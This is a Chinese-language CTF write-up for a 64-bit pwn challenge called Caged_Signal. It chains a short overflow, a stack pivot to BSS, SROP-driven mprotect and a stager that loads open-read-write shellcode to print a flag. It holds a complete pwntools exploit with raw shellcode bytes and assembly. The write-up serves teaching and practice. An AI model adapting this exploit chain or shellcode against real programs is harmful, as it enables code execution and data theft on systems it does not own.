---
tags:
  - pwn
  - writeup
  - SROP
  - seccomp
  - mprotect
  - shellcode
  - stack-pivot
  - caged_signal
created: 2026-07-21
updated: 2026-09-28
---

# Caged_Signal Writeup — 栈迁移 + SROP + seccomp + Shellcode

> 本文记录一个特定 64-bit ELF 的链：短溢出 → BSS 栈迁移 → SROP 调用 `mprotect` → 读取 shellcode。它依赖题目中实际存在的 gadget、BSS 映射与 seccomp 规则，不能作为“seccomp 题的固定五阶段模板”。

> **相关笔记：** `syscall是什么` · `栈迁移` · `SROP` · `seccomp白名单怎么看` · `rootersctf_2019_srop_wp`（SROP 基础）· `WP索引与复盘入口`

## 一、题目概况

| 项目 | 说明 |
|------|------|
| 文件 | `chall` (64-bit ELF, 动态链接, unstripped) |
| 保护 | NX 开启, 无 PIE, 无 Canary, **seccomp 沙箱** |
| 漏洞 | 第一个 `read` 只有 40 字节溢出空间; 第二个 `read` 可写 0x800 到 BSS |
| 难点 | 溢出太短放不下完整 ROP → 要栈迁移; seccomp 禁 execve → 要 ORW shellcode |
| 目标 | 读 `flag` 文件 |

## 二、逆向分析

### 2.1 main 函数

```c
int main() {
    char buf[16];               // rbp-0x10
    char message[0x800];        // 0x4040c0 (BSS)

    sandbox();                  // ① 开启 seccomp 沙箱

    write(1, a, 0x29);          // "Hello, challenger..."
    write(1, b, 0x18);          // "Do you know how to rop?"
    write(1, c, 0x1a);          // "Can you leave your phone?"

    read(0, buf, 0x28);         // ② ★ 读 40 字节到 16 字节缓冲区（溢出 24 字节）

    if (check_phone(buf)) {     // ③ 检查输入首字节是否非 0
        write(1, f, 0x2f);      // "Please tell the truth!"
        read(0, message, 0x800);// ④ ★ 0x800 字节写到 BSS！
        write(1, e, 0x25);      // "Do you have..."
    } else {
        write(1, d, 0x17);      // "Maybe you should bypass the sandbox~"
    }

    fake();                      // ⑤ mov eax,31; 没啥用
    return 0;                    // ← leave; ret
}
```

### 2.2 关键 Gadget

| 地址 | 指令 | 用途 |
|------|------|------|
| `0x40136d` | `leave; ret` | 栈迁移（栈 pivot） |
| `0x40137e` | `syscall; ret` | 触发系统调用 |
| `0x40141d` | `lea rax,[rbp-0x10]; ...; call read` | 二次 read（SREAD）|
| `0x401470` | `read(0, message, 0x800)` | 大 read 到 BSS |

### 2.3 check_phone — 输入首字节不能是 0

```c
int check_phone(char *s) {
    if (*s == 0) while(1);    // 首字节为 0 → 死循环！
    return 1;                  // 否则返回 1
}
```

只检查首字节。我们的 payload 首字节用非 0 字符就能过。

### 2.4 seccomp 沙箱

需从实际 BPF 规则确认 `execve`、`mprotect`、`read`、文件打开 syscall 与 `write` 是否允许。只有 `execve` 被禁且文件 I/O 路径可用时，ORW 才是合理终点；本文不能仅凭“用了 libseccomp”推断规则。

## 三、解题难点分析

> [!note] **🎯 为什么这题比 rootersctf 和 ciscn 复杂得多？**
> 三个难点叠加：
> 1. **溢出只有 40 字节** — 不够放完整 ROP 链 + sigframe（至少 ~200 字节）→ 必须先把栈搬到 BSS
> 2. **BSS 有 0x800 大 read** — 给了足够的空间，但需要先到达那个代码路径
> 3. **若过滤器允许 `mprotect` 且 BSS 覆盖完整页**，可用 SROP 改权限再跑 shellcode；否则必须重新选择题目允许的代码复用路线。

## 四、5 阶段攻击流程

```
┌──────────────────────────────────────────────────────────────┐
│ Stage 1: 溢出 + 栈迁移                                        │
│   40 字节: pad(16) + fake_rbp(BSS+0x100) + ret(LEAVE)        │
│   → main 返回时 rsp 跳到 BSS                                   │
├──────────────────────────────────────────────────────────────┤
│ Stage 2: 大 read → BSS 填入 ROP 链 + sigframe                  │
│   0x800 字节: 构造 fake stack + mprotect sigframe              │
│   → 链到 SREAD 等待下一阶段输入                                 │
├──────────────────────────────────────────────────────────────┤
│ Stage 3: 15 字节 → 触发 SROP                                  │
│   → rax=15 (rt_sigreturn) → mprotect(BSS, 0x2000, RWX)       │
│   → BSS + SCADDR 区域可执行                                    │
├──────────────────────────────────────────────────────────────┤
│ Stage 4: stager — 小段 shellcode 读入更大 shellcode           │
│   40 字节: 跳到 SCADDR+8 → read(0, SCADDR+0x100, 0x400)       │
│   → 等待 ORW shellcode                                        │
├──────────────────────────────────────────────────────────────┤
│ Stage 5: ORW shellcode                                       │
│   open("flag") → read → write → 打印 flag                     │
│   🎉 ctfshow{test_flag}                                       │
└──────────────────────────────────────────────────────────────┘
```

## 五、完整 Exploit

```python
from pwn import *
import os, time
context(os='linux', arch='amd64')

pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chall")
p = process(pwn)

SYSCALL = 0x40137e; LEVE = 0x40136d; SREAD = 0x40141d
BSS = 0x4040c0; SCADDR = 0x404500

# ORW 的打开 syscall必须与实际 seccomp 白名单匹配；此处 `openat2` 只是本题环境的假设，先 dump BPF 验证。
# 注意：这里必须是 mov r12, rsp / mov r13, rsp；把操作数写反会把 rsp 改成未初始化的 r12/r13。
shell  = b'\x31\xc0\x50\x48\xb8\x66\x6c\x61\x67\x00\x00\x00\x00\x50\x49\x89\xe4'
shell += b'\x6a\x00\x6a\x00\x6a\x00\x49\x89\xe5'
shell += b'\x48\xc7\xc7\x9c\xff\xff\xff\x4c\x89\xe6\x4c\x89\xea'
shell += b'\x49\xc7\xc2\x18\x00\x00\x00\xb8\xb5\x01\x00\x00\x0f\x05'
shell += b'\x48\x85\xc0\x78\x2c'
shell += b'\x89\xc7\x48\x89\xe6\x48\x81\xee\x00\x02\x00\x00'
shell += b'\x31\xc0\xba\x00\x01\x00\x00\x0f\x05'
shell += b'\x89\xc2\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05'
shell += b'\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05'
shell += b'\xbf\x01\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05'

# stager: read(0, SCADDR+0x100, 0x400); jmp there (18 bytes)
stager = b'\x31\xff\x31\xc0\xbe' + p32(SCADDR+0x100) + b'\xba\x00\x04\x00\x00\x0f\x05\xff\xe6'

# Stage 1: overflow → pivot stack to BSS
p.send(b"A"*16 + p64(BSS+0x100) + p64(LEVE) + b"\x00"*8)

# Stage 2: big read → fill BSS with fake stack + mprotect sigframe
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect          # mprotect syscall
frame.rdi = BSS & ~0xfff                     # 页对齐起始地址
frame.rsi = 0x2000                           # 长度须覆盖要执行的页且不能跨入未映射页；以 mappings 验证
frame.rdx = 7                                # PROT_READ|WRITE|EXEC
frame.rip = SYSCALL; frame.rsp = SCADDR; frame.rbp = SCADDR+0x10
fb = bytes(frame)

pivot = BSS + 0x100
pay2  = b"\x00"*0x100 + p64(pivot+0x18) + p64(SREAD)
pay2 += b"\x00"*7 + fb[7:]
pay2  = pay2.ljust(SCADDR - BSS, b"\x00") + p64(SREAD)
p.send(pay2)

# 等程序走完前面输出，停在 SREAD 的 read
p.recvuntil(b"Maybe you should bypass the sandbox~\n")

# Stage 3: 15 bytes → 触发 sigreturn → mprotect(BSS, RWX)
p.send(p64(SYSCALL) + fb[:7])
time.sleep(0.3)

# Stage 4: stager → read(0, SCADDR+0x100, 0x400)
p.send(p64(SCADDR+8) + stager + b"\x00"*(0x28 - 8 - len(stager)))
time.sleep(0.3)

# Stage 5: ORW shellcode → 读 flag 打印
p.send(shell)
# ORW 预期直接输出结果；按实际协议收取。只有 shellcode 真正启动交互 shell 才使用 interactive()。
print(p.recvall(timeout=3))
```

## 六、各阶段详解

### Stage 1 — 栈迁移

> [!note] **🎯 什么是栈迁移（Stack Pivot）？通俗版**
> 正常程序的栈在高地址（如 0x7ffc...），由内核分配。栈迁移就是把 rsp 指向另一个地方（如 BSS 段的 0x4040c0），让程序用我们提前布置好的"假栈"。好比把舞台从"内核给的小舞台"搬到"我们自己搭的大舞台"。
>
> **怎么搬？** `leave` 指令 = `mov rsp, rbp; pop rbp`。先控制 rbp 指向假栈，再执行 leave → rsp 就跳过去了。

```
发送: "A"*16 + p64(BSS+0x100) + p64(LEAVE)

栈布局:
┌──────────┬──────────────┬──────────────┐
│ "A"*16   │ BSS+0x100    │ 0x40136d     │
│ 填buf    │ fake rbp     │ ret→LEAVE    │
└──────────┴──────────────┴──────────────┘
 rbp-0x10   rbp            rbp+8

main leave: rsp=rbp, pop rbp → rbp=BSS+0x100, rsp=rbp+8
main ret:   rip=LEAVE

LEAVE: leave → rsp=BSS+0x100, pop rbp=[BSS+0x100]→Pay2值
       ret  → rip=[BSS+0x108]=SREAD → 等Stage3
```

> [!note] **🎯 为什么要栈迁移？**
> 溢出只有 24 字节（40-16），一个 sigframe 就要 ~200 字节。根本放不下。但 BSS 有 0x800 字节大 read → 把栈"搬"到 BSS → 在 BSS 上构造完整的 ROP 链 + sigframe。

### Stage 2 — BSS 填数据

> [!note] **🎯 BSS 是什么？为什么用 BSS？**
> BSS（Block Started by Symbol）是未初始化全局变量区。非 PIE 主程序的链接时虚拟地址通常固定，但仍须检查实际映射和写入范围；“可写”不代表“可执行”，也不能省略对页边界的验证。

大 read 把 0x800 字节写到 BSS。内容包括：
- fake stack frames（rbp 链指向正确位置）
- mprotect 的 sigreturn frame
- SREAD gadget 用于读下一阶段

### Stage 3 — SROP 开 RWX

> [!note] **🎯 为什么要 mprotect？**
> 若 NX 使 BSS 不可执行，且**实际 seccomp 允许** `mprotect`，可将包含 shellcode 的已映射页改为可执行。`mprotect` 的地址必须页对齐、范围有效，返回值必须在 syscall 后检查。

在此样本中，15 字节输入让相关 `read` 返回值成为 `rax=15`，再触发 sigreturn；内核恢复 frame 后调用 `mprotect(BSS, 0x2000, 7)`。只有该 syscall 实际返回 0，且页范围有效、过滤器放行时，BSS 页才变为 RWX；应在 syscall 后检查 `$rax` 和 `vmmap`。

### Stage 4 — Stager

> [!note] **🎯 为什么需要 stager？不能直接把 ORW shellcode 放在 Stage 4 里吗？**
> Stage 4 的 read 只有 0x28（40）字节，还要被 check_phone 和后续代码使用。40 字节放不下完整 ORW shellcode（约百字节量级）。stager 是个“搬运工”——本样本为 **18 字节**，作用是再读一次更大的数据（Stage 5）并跳过去执行。

确认 `mprotect` 成功后，BSS 页才可执行。再用一段 18 字节的小 shellcode（stager）读入真正的 ORW shellcode：

```asm
; stager: read(0, SCADDR+0x100, 0x400); jmp rsi
xor edi, edi       ; fd = 0
xor eax, eax       ; SYS_read
mov esi, 0x404600  ; buf = SCADDR+0x100
mov edx, 0x400     ; count
syscall
jmp rsi            ; 跳到刚读入的 shellcode
```

> [!warning] 这个极短 stager 为了省字节没有检查 `read` 的返回值：短读、EOF 或负错误码时，它仍会跳向目标地址。复现时应在 `syscall` 后断下检查 `$rax`，确认输入已完整进入目标区；生产代码不应采用这种省略错误处理的写法。

### Stage 5 — ORW Shellcode

> **深入阅读：** `syscall是什么`（系统调用表）· `shellcode`（shellcode 模板）· `shellcode_wp`（seccomp 下的 ORW shellcode）· `x86-x64汇编速查`

```asm
; 1. 构造 "flag\0" 字符串在栈上
xor eax, eax; push rax
mov rax, 0x67616c66; push rax     ; "flag"
mov r12, rsp                       ; r12 = ptr to "flag"

; 2. 以下使用 openat2 仅在 BPF 确实放行 437 且内核支持时成立；否则应按实际白名单选择 open/openat 等接口
push 0; push 0; push 0             ; struct open_how
mov r13, rsp                       ; r13 = ptr to how
mov rdi, -100                      ; AT_FDCWD
mov rsi, r12                       ; filename
mov rdx, r13                       ; how
mov r10, 24                        ; sizeof(how)
mov eax, 437                       ; SYS_openat2
syscall

; 3. read(fd, stack_buf, 0x100)
test rax,rax; js die               ; 检查 open 是否成功
mov edi, eax                       ; fd
mov rsi, rsp; sub rsi, 0x200       ; buf
xor eax,eax; mov edx,0x100; syscall

; 4. write(1, buf, len)
mov edx, eax; mov edi,1; mov eax,1; syscall

; 5. exit
xor edi,edi; mov eax,60; syscall
die: mov edi,1; mov eax,60; syscall
```

## 七、执行流程图

```
main():
  sandbox() → 禁 execve
  write 三句提示
  read(buf, 40)         ← Stage 1: 溢出+pivot
  check_phone → true    ← 'A' ≠ 0
  write "Please tell..."
  read(message, 0x800)  ← Stage 2: BSS填ROP+frame
  write "Do you have..."
  fake() → rax=31
  leave; ret → LEVE → pivot → SREAD
                           │
  SREAD: read(buf, 40) ← Stage 3: 15字节
  check_phone → true    ← SYSCALL首字节≠0
  write "Please tell..."
  read(message, 0x800)  ← Stage 4: stager 40字节
  write "Do you have..."
  fake() → rax=31
  leave; ret → ... → sigreturn → mprotect(BSS,RWX)
                           │
  → SREAD 再读 → stager执行                           
  read(SCADDR+0x100,0x400) ← Stage 5: ORW shellcode
  jmp → shellcode
  （按实际白名单选择 open/openat/openat2）→ read → write → 输出
```

## 八、SROP 三道题对比

| | rootersctf | ciscn_2019 | **Caged_Signal** |
|---|---|---|---|
| 溢出空间 | 大量 | 大量 | **仅 24 字节** |
| 栈迁移 | 不需要 | 不需要 | **需要 → BSS** |
| 地址泄露 | 视可写段地址与映射验证而定 | 需要 write 泄露 | 本题非 PIE，仍须确认 BSS 映射与写入范围 |
| seccomp | 无 | 无 | **有 → 是否禁 `execve` 以 BPF 为准** |
| 最终手段 | SROP→execve | SROP→execve | **SROP→mprotect→shellcode** |
| 暴力枚举 | 通常无需 | 仅在泄露关系无法精确推导时才考虑 | 通常无需 |

## 九、知识点总结

```
┌──────────────────────┬──────────────────────────────────────┐
│ 知识点                │ 说明                                 │
├──────────────────────┼──────────────────────────────────────┤
│ 栈迁移 (Stack Pivot)  │ 溢出不夠 → leave;ret 把 rsp 搬到 BSS  │
│ SROP → mprotect      │ 是否成功要看 BPF、页范围和 syscall 返回值 │
│ seccomp 约束          │ 若禁 `execve`，按已放行接口选择文件读取链 │
│ Stager               │ 小段代码读入更大代码；本样本 18 字节且需检查 read 返回值 │
│ ORW shellcode        │ open/openat/openat2 取决于 BPF、内核和参数 │
│ BSS 利用              │ 无 PIE 时地址常可预测，仍须确认映射、权限和写入范围 │
│ 多阶段接力            │ 短输入阶段负责铺路，大 BSS read 承载 frame 与后续数据 │
└──────────────────────┴──────────────────────────────────────┘
```

> 表中 `openat2` 与“BSS 地址固定”是本题写法的简写，不是可迁移结论：前者须由 seccomp BPF 和内核支持确认，后者仍须检查进程映射、页权限与实际写入范围。

## 十、复现前的四个验收点与资料

1. `x/8i 0x40136d` / `x/8i 0x40137e`：核对 gadget 的完整尾部，尤其是 `leave; ret` 是否真的存在。
2. `vmmap 0x4040c0`：核对 BSS 页、`SCADDR` 与 `mprotect` 范围都在实际映射内。
3. sigreturn 前：`info reg rax rsp rip`，应看到 `rax=15` 且 `$rsp` 正指 frame 起点；之后检查 `$rax` 是否为 `mprotect` 的成功返回值 0。
4. stager 的 `read` 后检查 `$rax` 与 `x/16i $rsi`，确认真正 shellcode 已写入且将从正确地址执行。

- [mprotect(2)](https://man7.org/linux/man-pages/man2/mprotect.2.html)：页对齐、长度和失败条件。
- [sigreturn(2)](https://man7.org/linux/man-pages/man2/sigreturn.2.html)：内核如何从信号帧恢复上下文。
- [seccomp filter 文档](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)：过滤器实际匹配的 syscall、架构与参数。

## 相关代码与实战模板

- 本页模板入口：`pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。
